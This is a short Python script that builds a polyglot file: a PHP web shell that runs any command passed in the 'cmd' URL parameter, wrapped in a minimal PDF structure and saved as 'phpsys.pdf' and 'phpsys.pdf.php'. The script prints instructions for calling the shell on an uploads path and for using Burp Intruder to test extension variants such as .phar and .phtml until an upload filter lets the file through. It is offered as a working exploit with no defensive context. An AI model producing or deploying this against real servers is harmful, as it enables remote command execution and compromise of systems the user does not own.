from io import BytesIO

# PHP content (example: simple system execution shell)
php_content = '''
<?php 
system($_GET["cmd"]);
?>
'''

# PDF file header and footer
pdf_header = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 5 0 R >>\nstream\n"
pdf_footer = b"\nendstream\nendobj\n5 0 obj\n11\nendobj\nxref\n0 6\n0000000000 65535 f \n0000000010 00000 n \n0000000079 00000 n \n0000000178 00000 n \n0000000279 00000 n \n0000000372 00000 n \ntrailer\n<< /Root 1 0 R /Size 6 >>\nstartxref\n482\n%%EOF"

# Function to create a PDF file with embedded PHP code
def create_php_to_pdf():
    # Create an in-memory byte buffer
    f = BytesIO()
    
    # Write the PDF file header
    f.write(pdf_header)
    
    # Embed the PHP code inside the PDF stream
    f.write(php_content.encode('utf-8'))
    
    # Write the PDF footer
    f.write(pdf_footer)
    
    # Reset buffer position to the beginning
    f.seek(0)
    
    return f

# Generate a PDF file with embedded PHP code
php_pdf_file = create_php_to_pdf()

# Save as a .pdf.php file (or modify as needed)
with open('phpsys.pdf.php', 'wb') as output_file:
    output_file.write(php_pdf_file.read())

# Recreate buffer and save as a .pdf file
php_pdf_file = create_php_to_pdf()  # Re-generate buffer
with open('phpsys.pdf', 'wb') as output_file:
    output_file.write(php_pdf_file.read())

# Print success message
print("Files 'phpsys.pdf' and 'phpsys.pdf.php' have been successfully created with embedded PHP code.")
print("You can try exploiting by accessing: http://example.com/uploads/phpsys.pdf.php?cmd=whoami")
print("If the upload fails, use Burp Suite Intruder to test different extensions, such as .pdf.phar or .pdf.phtml.")
print("Automate the extension testing using Burp Intruder by setting the payload position.")
